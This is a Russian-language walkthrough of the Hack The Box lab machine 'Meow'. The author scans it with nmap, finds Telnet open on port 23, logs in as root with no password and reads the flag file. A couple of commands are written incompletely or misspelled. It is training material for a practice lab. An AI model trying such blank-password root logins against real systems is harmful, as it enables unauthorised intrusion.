# HackTheBox — Starting Point Tier 0 — Meow

Тут я начинаю знакомиться с Hack The Box и его Starting Point.

Для практических заданий я буду использовать свою Linux-машину и подключение к HTB через VPN.

---

# Подключение к HTB

Сначала мне нужно подключиться к VPN Hack The Box.

Для этого я скачиваю `.ovpn` файл из настроек подключения Starting Point и запускаю OpenVPN:

```bash
sudo openvpn
```

После этого я запускаю машину Meow и получаю её IP-адрес.

---

# Enumeration

Первым делом я хочу понять, какие порты открыты на машине и какие сервисы на них работают.

Для этого использую Nmap:

```bash
nmapv 10.129.1.17
```

В результате я вижу открытый порт:

```text
23/tcp
```

Порт 23 используется сервисом **Telnet**.

Теперь я знаю, что на машине запущен Telnet и могу попробовать подключиться к нему.

Hack The Box также использует Meow как пример для знакомства с Nmap и обнаружения Telnet на 23/tcp.

---

# Telnet

Telnet — это сетевой протокол, который позволяет устанавливать удалённое соединение с другой системой.

Так как порт 23 открыт, я пробую подключиться к нему:

```bash
telnet 10.129.1.17
```

После подключения система запрашивает логин.

Из результатов enumeration я уже знаю, что нужно попробовать получить доступ к удалённой системе через этот сервис.

---

# Получение доступа

В данном случае проблема заключается в неправильной настройке сервиса.

Я пробую подключиться к Telnet с учётными данными:

```text
Username: root
Password: 
```

Пароль не требуется.

После успешной аутентификации я получаю командную оболочку на удалённой машине.

```bash
whoami
```

Получаю:

```text
root
```

То есть я сразу получил доступ с максимальными привилегиями.

---

# Поиск flag

Теперь, когда у меня есть shell с правами `root`, я могу посмотреть содержимое текущей директории:

```bash
ls
```

После этого нахожу файл с flag и читаю его:

```bash
cat flag.txt
```

Таким образом, я получаю flag и завершаю машину Meow.
